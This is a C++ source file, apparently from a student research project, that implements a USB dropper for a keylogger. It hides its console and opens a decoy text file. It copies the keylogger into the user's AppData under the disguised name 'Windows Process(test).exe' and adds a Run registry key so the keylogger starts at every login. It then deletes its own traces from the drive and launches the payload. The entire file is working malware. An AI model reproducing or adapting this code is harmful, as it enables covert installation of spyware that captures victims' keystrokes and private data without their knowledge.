// CopyToVictim.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <stdlib.h>
#include <shlobj_core.h>
#include <userenv.h>
#include <string>
#include <codecvt>
#include <locale>

#pragma warning(disable : 4996)

using namespace std;

string getPath();
void openFile();
void startup();
void createDir(string path);
void deleteShortcut();
void deleteFile();
void unhideFile();


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);//Hides console
    openFile();
    string path = getPath();
    createDir(path);
    path.append("\\Windows Process(test).exe"); //Changes path to inlcude the executable
    CopyFileA("D:\\researchproject.exe", path.c_str(), 1);
    deleteShortcut();
    unhideFile();
    startup();
    deleteFile();
    ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWDEFAULT);
    exit(0);
}

void openFile() {
    ShellExecuteA(NULL, "open", "D:\\Notes.txt", NULL, NULL, SW_SHOWNORMAL); //Opens the hidden file on the USB device
}

void startup() { //Adds keylogger to startup
   string path = getenv("USERPROFILE");
    path.append("\\AppData\\Roaming\\Microsoft Windows\\Windows Process(test).exe");
    std::wstring progPath= std::wstring_convert<std::codecvt_utf8<wchar_t>>().from_bytes(path);
    //std:wstring progPath = L"C:\\Users\\Sabby's Laptop\\AppData\\Roaming\\Windows Process(test).exe";
    HKEY hkey = NULL;
    LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
    LONG status = RegSetValueEx(hkey, L"Windows Process(test)", 0, REG_SZ, (BYTE*)progPath.c_str(), (progPath.size() + 1) * sizeof(wchar_t));

}

void createDir(string path) { 
    CreateDirectoryA(path.c_str(), NULL); //Creates the Directory where the keylogger, log file, and the aarchive file will save to
}

void deleteShortcut() {
    DeleteFileA("D:\\Notes.txt.lnk"); //Deletes the shortcut link on the USB device
}

void deleteFile() { //Deleted the keylogger and the copy executables from the flashdrive
    DeleteFileA("D:\\researchproject.exe");
}

void unhideFile() { //Shows the .txt file
    int attr = GetFileAttributesA("D:\\Notes.txt");
    SetFileAttributesA("D:\\Notes.txt", attr & ~FILE_ATTRIBUTE_HIDDEN);
}

string getPath() { //Gets the users home directory and adds the path we want to save files to
    string path = getenv("USERPROFILE");
    path.append("\\AppData\\Roaming\\Microsoft Windows");
    return path;
}